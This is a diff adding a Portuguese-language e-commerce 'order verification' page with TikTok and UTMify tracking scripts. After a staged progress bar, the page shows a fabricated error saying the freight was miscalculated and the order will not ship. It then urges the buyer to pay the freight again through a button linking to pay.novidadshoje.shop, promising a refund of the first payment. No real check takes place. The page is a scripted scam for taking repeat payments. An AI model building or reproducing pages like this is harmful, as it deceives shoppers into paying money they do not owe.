@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Pedido</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.tikTokPixelId = "6919515033d46d9bc366c3a4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D4CJVH3C77U2TCIL2SJ0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+    <!-- Seção do topo -->
+    <div class="top-bar">
+    </div>
+    <!-- Seção de verificação do pedido -->
+    <div id="verification-section" class="full-screen-section">
+        <div class="verification-content">
+            <div class="success-icon">
+                <div class="checkmark">✓</div>
+            </div>
+            <h1>Seu pedido foi concluído!</h1>
+            <p>Aguarde enquanto realizamos a verificação do pedido...</p>
+            <!-- Barra de progresso animada -->
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            <div class="status-text">Processando...</div>
+        </div>
+    </div>
+    <!-- Seção após a verificação -->
+    <div id="error-section" class="full-screen-section hidden">
+        <!-- Box separadas que aparecem uma abaixo da outra -->
+        <div class="box-stage hidden" id="box-1">
+            <div class="status-icon success">
+                <span class="icon">✓</span>
+            </div>
+            <h3>Pedido Concluído com Sucesso</h3>
+            <p>Aguarde um momento...</p>
+        </div>
+        <div class="box-stage hidden" id="box-2">
+            <div class="status-icon warning">
+                <span class="icon">⚠</span>
+            </div>
+            <h3>Validação do CEP para Entrega</h3>
+            <p>Estamos verificando as informações...</p>
+        </div>
+        <div class="box-stage hidden" id="box-3">
+            <div class="status-icon error">
+                <span class="icon">✕</span>
+            </div>
+            <h3>O valor do Frete foi calculado errado para sua região</h3>
+            <p>O pedido não será enviado. Faça a correção do pagamento do frete para que seu pedido seja enviado.</p>
+            <a href="https://pay.novidadshoje.shop/69195dde01d4e947cf51c5f7" id="retry-button" class="retry-button">
+                <span class="button-icon">💳</span>
+                PAGAR FRETE
+            </a>
+            <div class="refund-notice">
+                <small>O valor pago do frete anterior será reembolsado</small>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</script>
+</body>
+</html>
